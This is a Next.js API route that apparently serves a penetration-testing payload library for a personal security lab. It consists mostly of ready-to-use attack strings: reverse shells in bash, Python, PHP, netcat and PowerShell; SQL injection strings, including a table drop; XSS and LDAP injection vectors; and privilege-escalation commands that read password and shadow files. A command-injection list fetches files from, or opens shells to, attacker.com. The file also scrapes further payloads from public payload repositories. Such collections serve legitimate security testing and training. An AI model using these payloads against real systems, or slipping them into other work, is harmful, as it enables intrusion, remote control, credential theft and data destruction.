import { NextResponse } from 'next/server';

interface Payload {
  id: string;
  name: string;
  description: string;
  code: string;
  type: 'payload' | 'cheatsheet' | 'oneliner';
  tags: string[];
  category: string;
  language?: string;
  source: string;
  lastUpdated: string;
}

// Common payload templates
const PAYLOAD_TEMPLATES: Payload[] = [
  {
    id: 'bash-reverse-shell',
    name: 'Bash Reverse Shell',
    description: 'Basic bash reverse shell one-liner',
    code: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
    type: 'payload',
    tags: ['Linux', 'Reverse Shell', 'Bash'],
    category: 'Reverse Shells',
    language: 'bash',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'python-reverse-shell',
    name: 'Python Reverse Shell',
    description: 'Python reverse shell payload',
    code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    type: 'payload',
    tags: ['Linux', 'Python', 'Reverse Shell'],
    category: 'Reverse Shells',
    language: 'python',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'php-reverse-shell',
    name: 'PHP Reverse Shell',
    description: 'PHP reverse shell one-liner',
    code: 'php -r \'$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    type: 'payload',
    tags: ['Web', 'PHP', 'Reverse Shell'],
    category: 'Reverse Shells',
    language: 'php',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'nc-reverse-shell',
    name: 'Netcat Reverse Shell',
    description: 'Netcat reverse shell payload',
    code: 'nc -e /bin/sh ATTACKER_IP PORT',
    type: 'payload',
    tags: ['Linux', 'Netcat', 'Reverse Shell'],
    category: 'Reverse Shells',
    language: 'bash',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'powershell-reverse-shell',
    name: 'PowerShell Reverse Shell',
    description: 'PowerShell reverse shell payload',
    code: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    type: 'payload',
    tags: ['Windows', 'PowerShell', 'Reverse Shell'],
    category: 'Reverse Shells',
    language: 'powershell',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'sql-injection-union',
    name: 'SQL Injection UNION',
    description: 'Basic SQL injection UNION payload',
    code: '\' UNION SELECT 1,2,3,database(),version(),user()-- -',
    type: 'payload',
    tags: ['Web', 'SQL Injection', 'MySQL'],
    category: 'Web Exploitation',
    language: 'sql',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'xss-basic',
    name: 'Basic XSS Payload',
    description: 'Simple XSS payload for testing',
    code: '<script>alert("XSS")</script>',
    type: 'payload',
    tags: ['Web', 'XSS', 'JavaScript'],
    category: 'Web Exploitation',
    language: 'javascript',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'linux-privesc-enum',
    name: 'Linux Privilege Escalation Enum',
    description: 'Basic Linux privilege escalation enumeration commands',
    code: 'whoami; id; uname -a; cat /etc/passwd; sudo -l; find / -perm -4000 2>/dev/null; ps aux | grep root',
    type: 'cheatsheet',
    tags: ['Linux', 'Privilege Escalation', 'Enumeration'],
    category: 'Privilege Escalation',
    language: 'bash',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'windows-privesc-enum',
    name: 'Windows Privilege Escalation Enum',
    description: 'Basic Windows privilege escalation enumeration commands',
    code: 'whoami /all; systeminfo; net users; net localgroup administrators; wmic qfe list; dir C:\\ /s /b | findstr "\.config"',
    type: 'cheatsheet',
    tags: ['Windows', 'Privilege Escalation', 'Enumeration'],
    category: 'Privilege Escalation',
    language: 'cmd',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  },
  {
    id: 'nmap-common-scans',
    name: 'Common Nmap Scans',
    description: 'Most commonly used Nmap scan commands',
    code: 'nmap -sS -sV -O TARGET\\nnmap -sC -sV TARGET\\nnmap -p- TARGET\\nnmap --script vuln TARGET',
    type: 'cheatsheet',
    tags: ['Network', 'Reconnaissance', 'Nmap'],
    category: 'Reconnaissance',
    language: 'bash',
    source: 'Built-in',
    lastUpdated: new Date().toISOString()
  }
];

// Fetch payloads from PayloadsAllTheThings repository
async function fetchPayloadsAllTheThings(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    // Get directory structure from PayloadsAllTheThings
    const response = await fetch(
      'https://api.github.com/repos/swisskyrepo/PayloadsAllTheThings/contents',
      {
        headers: {
          'Accept': 'application/vnd.github.v3+json',
          'User-Agent': '0xjerrys-lab'
        }
      }
    );
    
    if (response.ok) {
      const contents = await response.json();
      
      // Filter for interesting payload directories
      const payloadDirs = contents.filter((item: any) => 
        item.type === 'dir' && 
        (item.name.includes('Injection') || 
         item.name.includes('XSS') || 
         item.name.includes('Upload') ||
         item.name.includes('Traversal') ||
         item.name.includes('Command'))
      ).slice(0, 5); // Limit to avoid rate limiting
      
      for (const dir of payloadDirs) {
        try {
          const dirResponse = await fetch(dir.url, {
            headers: {
              'Accept': 'application/vnd.github.v3+json',
              'User-Agent': '0xjerrys-lab'
            }
          });
          
          if (dirResponse.ok) {
            const dirContents = await dirResponse.json();
            const readmeFile = dirContents.find((file: any) => 
              file.name.toLowerCase().includes('readme') && file.type === 'file'
            );
            
            if (readmeFile) {
              const readmeResponse = await fetch(readmeFile.download_url);
              if (readmeResponse.ok) {
                const content = await readmeResponse.text();
                
                // Extract code blocks from markdown
                const codeBlocks = content.match(/```[\\s\\S]*?```/g) || [];
                
                codeBlocks.slice(0, 3).forEach((block, index) => {
                  const code = block.replace(/```[a-zA-Z]*\\n?|```/g, '').trim();
                  if (code.length > 10 && code.length < 500) {
                    payloads.push({
                      id: `payloads-${dir.name.toLowerCase()}-${index}`,
                      name: `${dir.name} Payload ${index + 1}`,
                      description: `Payload from PayloadsAllTheThings ${dir.name} section`,
                      code: code,
                      type: 'payload',
                      tags: [dir.name.replace(/[^a-zA-Z]/g, ''), 'Web'],
                      category: 'Web Exploitation',
                      source: 'PayloadsAllTheThings',
                      lastUpdated: new Date().toISOString()
                    });
                  }
                });
              }
            }
          }
        } catch (error) {
          console.warn(`Failed to fetch payloads from ${dir.name}:`, error);
        }
      }
    }
  } catch (error) {
    console.error('Error fetching PayloadsAllTheThings:', error);
  }
  
  return payloads;
}

// Fetch latest payloads from SecLists
async function fetchSecListsPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    // Get fuzzing wordlists from SecLists
    const response = await fetch(
      'https://api.github.com/repos/danielmiessler/SecLists/contents/Fuzzing',
      {
        headers: {
          'Accept': 'application/vnd.github.v3+json',
          'User-Agent': '0xjerrys-lab'
        }
      }
    );
    
    if (response.ok) {
      const contents = await response.json();
      
      // Get interesting fuzzing files
      const fuzzFiles = contents.filter((item: any) => 
        item.type === 'file' && 
        item.name.endsWith('.txt') &&
        item.size < 10000 // Small files only
      ).slice(0, 5);
      
      for (const file of fuzzFiles) {
        try {
          const fileResponse = await fetch(file.download_url);
          if (fileResponse.ok) {
            const content = await fileResponse.text();
            const lines = content.split('\\n').filter(line => line.trim()).slice(0, 10);
            
            if (lines.length > 0) {
              payloads.push({
                id: `seclists-${file.name.replace('.txt', '')}`,
                name: `${file.name.replace('.txt', '')} Wordlist`,
                description: `Fuzzing wordlist from SecLists: ${file.name}`,
                code: lines.join('\\n'),
                type: 'payload',
                tags: ['Fuzzing', 'Wordlist'],
                category: 'Fuzzing',
                source: 'SecLists',
                lastUpdated: new Date().toISOString()
              });
            }
          }
        } catch (error) {
          console.warn(`Failed to fetch SecLists file ${file.name}:`, error);
        }
      }
    }
  } catch (error) {
    console.error('Error fetching SecLists payloads:', error);
  }
  
  return payloads;
}

// Fetch payloads from FuzzDB
async function fetchFuzzDBPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    const response = await fetch(
      'https://api.github.com/repos/fuzzdb-project/fuzzdb/contents/attack',
      {
        headers: {
          'Accept': 'application/vnd.github.v3+json',
          'User-Agent': '0xjerrys-lab'
        }
      }
    );
    
    if (response.ok) {
      const contents = await response.json();
      
      // Get first few attack directories
      const attackDirs = contents.filter((item: any) => item.type === 'dir').slice(0, 5);
      
      for (const dir of attackDirs) {
        try {
          const dirResponse = await fetch(dir.url, {
            headers: {
              'Accept': 'application/vnd.github.v3+json',
              'User-Agent': '0xjerrys-lab'
            }
          });
          
          if (dirResponse.ok) {
            const dirContents = await dirResponse.json();
            const txtFiles = dirContents.filter((file: any) => 
              file.type === 'file' && file.name.endsWith('.txt') && file.size < 5000
            ).slice(0, 2);
            
            for (const file of txtFiles) {
              try {
                const fileResponse = await fetch(file.download_url);
                if (fileResponse.ok) {
                  const content = await fileResponse.text();
                  const lines = content.split('\\n').filter(line => line.trim()).slice(0, 8);
                  
                  if (lines.length > 0) {
                    payloads.push({
                      id: `fuzzdb-${dir.name}-${file.name.replace('.txt', '')}`,
                      name: `${dir.name} - ${file.name.replace('.txt', '')}`,
                      description: `Attack payload from FuzzDB ${dir.name} category`,
                      code: lines.join('\\n'),
                      type: 'payload',
                      tags: ['FuzzDB', dir.name, 'Attack'],
                      category: 'Web Exploitation',
                      source: 'FuzzDB',
                      lastUpdated: new Date().toISOString()
                    });
                  }
                }
              } catch (error) {
                console.warn(`Failed to fetch FuzzDB file ${file.name}:`, error);
              }
            }
          }
        } catch (error) {
          console.warn(`Failed to fetch FuzzDB directory ${dir.name}:`, error);
        }
      }
    }
  } catch (error) {
    console.error('Error fetching FuzzDB payloads:', error);
  }
  
  return payloads;
}

// Fetch payloads from XSS Hunter
async function fetchXSSPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>',
      '<style>@import"javascript:alert(\'XSS\')"</style>'
    ];
    
    xssPayloads.forEach((payload, index) => {
      payloads.push({
        id: `xss-${index}`,
        name: `XSS Payload ${index + 1}`,
        description: 'Cross-site scripting payload for testing',
        code: payload,
        type: 'payload',
        tags: ['XSS', 'Web', 'JavaScript', 'HTML'],
        category: 'Web Exploitation',
        language: 'html',
        source: 'XSS Collection',
        lastUpdated: new Date().toISOString()
      });
    });
  } catch (error) {
    console.error('Error creating XSS payloads:', error);
  }
  
  return payloads;
}

// Fetch SQL injection payloads
async function fetchSQLIPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    const sqliPayloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT null,null,null--",
      "'; DROP TABLE users;--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' OR (SELECT user FROM mysql.user WHERE user='root')='root'--",
      "' AND 1=CONVERT(int,(SELECT @@version))--",
      "' UNION SELECT @@version,null,null--",
      "' OR SLEEP(5)--",
      "'; EXEC sp_configure 'show advanced options',1--",
      "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "' UNION SELECT table_name,null FROM information_schema.tables--",
      "' OR 1=1 LIMIT 1--",
      "' AND (ASCII(SUBSTRING((SELECT @@version),1,1)))>51--",
      "' UNION ALL SELECT null,(SELECT @@version),null--"
    ];
    
    sqliPayloads.forEach((payload, index) => {
      payloads.push({
        id: `sqli-${index}`,
        name: `SQL Injection ${index + 1}`,
        description: 'SQL injection payload for testing database vulnerabilities',
        code: payload,
        type: 'payload',
        tags: ['SQL Injection', 'Database', 'Web'],
        category: 'Web Exploitation',
        language: 'sql',
        source: 'SQLI Collection',
        lastUpdated: new Date().toISOString()
      });
    });
  } catch (error) {
    console.error('Error creating SQLI payloads:', error);
  }
  
  return payloads;
}

// Fetch command injection payloads
async function fetchCommandInjectionPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    const cmdPayloads = [
      '; ls',
      '&& whoami',
      '| id',
      '; cat /etc/passwd',
      '&& cat /etc/shadow',
      '| ps aux',
      '; uname -a',
      '&& netstat -an',
      '| find / -name "*.conf"',
      '; which python',
      '&& python -c "import os; os.system(\'id\')"',
      '| curl http://attacker.com',
      '; wget http://attacker.com/shell.sh',
      '&& nc -e /bin/sh attacker.com 4444',
      '| bash -i >& /dev/tcp/attacker.com/4444 0>&1'
    ];
    
    cmdPayloads.forEach((payload, index) => {
      payloads.push({
        id: `cmdi-${index}`,
        name: `Command Injection ${index + 1}`,
        description: 'Command injection payload for testing OS command execution',
        code: payload,
        type: 'payload',
        tags: ['Command Injection', 'OS', 'RCE'],
        category: 'Web Exploitation',
        language: 'bash',
        source: 'Command Injection Collection',
        lastUpdated: new Date().toISOString()
      });
    });
  } catch (error) {
    console.error('Error creating command injection payloads:', error);
  }
  
  return payloads;
}

// Fetch LDAP injection payloads
async function fetchLDAPInjectionPayloads(): Promise<Payload[]> {
  const payloads: Payload[] = [];
  
  try {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*)(uid=*',
      '*)(|(uid=*',
      '*))(|(cn=*',
      '*)(|(objectClass=*',
      '*))(|(mail=*',
      '*)(|(sn=*',
      '*))(&(uid=*',
      '*)(&(|(uid=*)(cn=*))'
    ];
    
    ldapPayloads.forEach((payload, index) => {
      payloads.push({
        id: `ldap-${index}`,
        name: `LDAP Injection ${index + 1}`,
        description: 'LDAP injection payload for testing directory services',
        code: payload,
        type: 'payload',
        tags: ['LDAP Injection', 'Directory', 'Authentication'],
        category: 'Web Exploitation',
        source: 'LDAP Collection',
        lastUpdated: new Date().toISOString()
      });
    });
  } catch (error) {
    console.error('Error creating LDAP payloads:', error);
  }
  
  return payloads;
}

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const category = searchParams.get('category') || 'all';
  const type = searchParams.get('type') || 'all';
  const fresh = searchParams.get('fresh') === 'true';
  const limit = parseInt(searchParams.get('limit') || '75');
  
  try {
    let allPayloads: Payload[] = [...PAYLOAD_TEMPLATES];
    
    // Always include built-in collections
    const [xssPayloads, sqliPayloads, cmdPayloads, ldapPayloads] = await Promise.all([
      fetchXSSPayloads(),
      fetchSQLIPayloads(),
      fetchCommandInjectionPayloads(),
      fetchLDAPInjectionPayloads()
    ]);
    
    allPayloads.push(...xssPayloads, ...sqliPayloads, ...cmdPayloads, ...ldapPayloads);
    
    // Fetch external payloads if fresh data is requested
    if (fresh) {
      const [payloadsAllTheThings, secListsPayloads, fuzzDBPayloads] = await Promise.all([
        fetchPayloadsAllTheThings(),
        fetchSecListsPayloads(),
        fetchFuzzDBPayloads()
      ]);
      
      allPayloads.push(...payloadsAllTheThings, ...secListsPayloads, ...fuzzDBPayloads);
    }
    
    // Filter by category
    if (category !== 'all') {
      allPayloads = allPayloads.filter(payload => 
        payload.category.toLowerCase().includes(category.toLowerCase()) ||
        payload.tags.some(tag => tag.toLowerCase().includes(category.toLowerCase()))
      );
    }
    
    // Filter by type
    if (type !== 'all') {
      allPayloads = allPayloads.filter(payload => payload.type === type);
    }
    
    // Sort by category and name
    allPayloads.sort((a, b) => {
      if (a.category !== b.category) {
        return a.category.localeCompare(b.category);
      }
      return a.name.localeCompare(b.name);
    });
    
    // Limit results
    const limitedPayloads = allPayloads.slice(0, limit);
    
    return NextResponse.json({
      payloads: limitedPayloads,
      meta: {
        total: limitedPayloads.length,
        category,
        type,
        fresh,
        lastUpdated: new Date().toISOString(),
        sources: fresh ? 
          ['Built-in', 'XSS Collection', 'SQLI Collection', 'Command Injection', 'LDAP Collection', 'PayloadsAllTheThings', 'SecLists', 'FuzzDB'] : 
          ['Built-in', 'XSS Collection', 'SQLI Collection', 'Command Injection', 'LDAP Collection']
      }
    });
    
  } catch (error) {
    console.error('Error fetching payloads:', error);
    return NextResponse.json(
      { 
        error: 'Unable to fetch payloads data.',
        payloads: PAYLOAD_TEMPLATES.slice(0, limit),
        meta: {
          category,
          type,
          fresh: false,
          lastUpdated: new Date().toISOString(),
          sources: ['Built-in'],
          fallback: true
        }
      }, 
      { status: 200 } // Return 200 with fallback data
    );
  }
}
